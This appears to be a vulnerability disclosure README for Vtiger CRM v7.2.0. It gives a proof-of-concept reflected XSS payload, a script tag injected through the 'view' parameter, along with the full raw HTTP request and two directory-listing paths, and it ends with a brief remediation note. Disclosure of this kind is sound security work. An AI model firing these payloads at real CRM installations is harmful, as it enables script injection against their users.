# Vtiger-CRM-Vulnerabilities
Vtiger CRM v7.2.0 has Cross-Site Scripting (XSS) and directory listing vulnerabilities.

## Vtiger CRM Reflected XSS Vulnerability
Reflected XSS in the [Vtiger CRM v7.2.0](https://www.vtiger.com/open-source-crm/download-open-source/) can result in an attacker performing malicious actions to users who open a maliciously crafted link or third-party web page.

### PoC
To exploit vulnerability, someone could use a GET request to **'http://[server]//vtigercrm/index.php?app=&module=Campaigns&view=%3Ctest%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3E'** by manipulating **'view'** parameter in the request header to impact users who open a maliciously crafted link or third-party web page.


```
GET /vtigercrm/index.php?app=&module=Campaigns&view=%3Ctest%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3E HTTP/1.1
Host: 172.16.155.128
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=nc32t8env2h236vf3s6ftor3im
Upgrade-Insecure-Requests: 1
```

![alt tag](https://emreovunc.com/blog/en/vtiger_crm_xss_01.png)

![alt tag](https://emreovunc.com/blog/en/vtiger_crm_xss_02.png)

![alt tag](https://emreovunc.com/blog/en/vtiger_crm_xss_03.png)

## Vtiger CRM Directory Listing Vulnerabilities

### PoC

```
http://[server]/vtigercrm/libraries/
http://[server]/vtigercrm/layouts/
```

![alt tag](https://emreovunc.com/blog/en/vtiger_crm_directorylisting_02.png)

![alt tag](https://emreovunc.com/blog/en/vtiger_crm_directorylisting_01.png)


## Remediation
You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.
